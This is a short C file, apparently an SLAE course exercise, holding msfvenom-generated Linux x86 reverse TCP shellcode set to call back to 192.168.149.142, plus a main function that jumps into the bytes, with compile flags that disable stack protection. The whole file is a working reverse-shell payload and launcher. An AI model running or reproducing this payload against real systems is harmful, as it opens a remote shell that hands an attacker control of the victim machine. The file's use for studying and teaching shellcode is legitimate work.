/*
Tested on       : Linux/x86
Author          : Elham AlShehri
ID              : SLAE-1538
Shellcode Size  : 95 bytes ( Null-free )
Description     : linux/x86/shell_reverse_tcp shellcode test (  LHOST=192.168.149.142 )

Test Using:
        gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/
#include<stdio.h>
#include<string.h>

// msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.149.142 -b "\x00" -f c -v shellcode
unsigned char shellcode[] = 
"\xd9\xe8\xb8\x5f\x92\xed\x97\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x12\x83\xc6\x04\x31\x46\x13\x03\x19\x81\x0f\x62\x94\x7e\x38"
"\x6e\x85\xc3\x94\x1b\x2b\x4d\xfb\x6c\x4d\x80\x7c\x1f\xc8\xaa"
"\x42\xed\x6a\x83\xc5\x14\x02\xd4\x9e\x72\x5c\xbc\xdc\x7c\x71"
"\x61\x68\x9d\xc1\xff\x3a\x0f\x72\xb3\xb8\x26\x95\x7e\x3e\x6a"
"\x3d\xef\x10\xf8\xd5\x87\x41\xd1\x47\x31\x17\xce\xd5\x92\xae"
"\xf0\x69\x1f\x7c\x72";


int main(int argc, char *argv[])
{
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}
